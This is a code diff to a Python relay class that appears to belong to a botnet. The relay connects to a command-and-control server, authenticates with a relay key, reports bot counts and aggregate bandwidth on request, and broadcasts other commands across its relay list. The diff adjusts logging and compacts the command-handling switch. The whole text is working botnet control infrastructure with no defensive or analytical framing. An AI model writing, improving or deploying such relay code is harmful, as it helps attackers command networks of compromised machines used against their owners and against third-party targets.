@@ -34,7 +34,7 @@ class Relay():
     ) -> None:
         self.log(f"send {data}")
 
-        for relay in self.config.relay_list:
+        for relay in self.config.relay_list.copy().keys():
             try: self.send(relay, f'{data}', False, False)
             except Exception:
                 self.config.relay_list.pop(relay)
@@ -48,10 +48,11 @@ class Relay():
         while 1:
             try:
                 c2.connect(self.config.cnc_addr.CNC_ADDR)
-                self.log("relay online")
+                self.log("relay connecting to cnc ...")
 
                 while 1:
                     data: str = c2.recv(1024).decode()
+                    self.log(f"relay recv: {[i for i in data]}")
                     if 'Username' in data:
                         c2.send(f'RELAY[p:{self.config.RELAY_KEY}]'.encode())
                         break
@@ -62,9 +63,11 @@ class Relay():
                         c2.send(f'{self.config.RELAY_KEY}'.encode())
                         break
 
+                self.log("relay connected to cnc")
                 break
+
             except Exception:
-                self.log("relay offline, retry later")
+                self.log("relay offline, will retry later")
                 time.sleep(self.config.relay_time.RELAY)
 
         while 1:
@@ -79,20 +82,10 @@ class Relay():
                 command: str = args[0].upper()
 
                 match command:
-                    case 'RPING':
-                        self.log("rping")
-                        c2.send(f'RPONG[p:{self.config.RELAY_KEY}]'.encode())
-
-                    case 'RNETSPEED':
-                        self.log("rnetspeed")
-                        c2.send(f"{round(sum(self.config.speed))}".encode())
-
-                    case 'RNETBOTS':
-                        self.log("rnetbots")
-                        c2.send(f"{len(self.config.bots)}".encode())
-
-                    case _:
-                        self.broadcast(data)
+                    case 'RPING': c2.send(f'RPONG[p:{self.config.RELAY_KEY}]'.encode())
+                    case 'RNETSPEED': c2.send(str(sum(self.config.speed)).encode())
+                    case 'RNETBOTS': c2.send(str(len(self.config.bots)).encode())
+                    case _: self.broadcast(data)
 
             except Exception: break
 
